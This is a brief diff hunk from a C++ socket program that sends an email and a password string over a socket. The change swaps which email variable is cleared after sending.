@@ -53,7 +53,7 @@
                 int sendResult = send(sock,EmailSend.c_str(), EmailSend.size() , 0);
                 int sendResult2 = send(sock, PasswordSend.c_str(), PasswordSend.size(), 0);
 
-                EmailSend.clear();
+                EmailStr.clear();
                 PasswordStr.clear();
 
                 if (sendResult != SOCKET_ERROR)
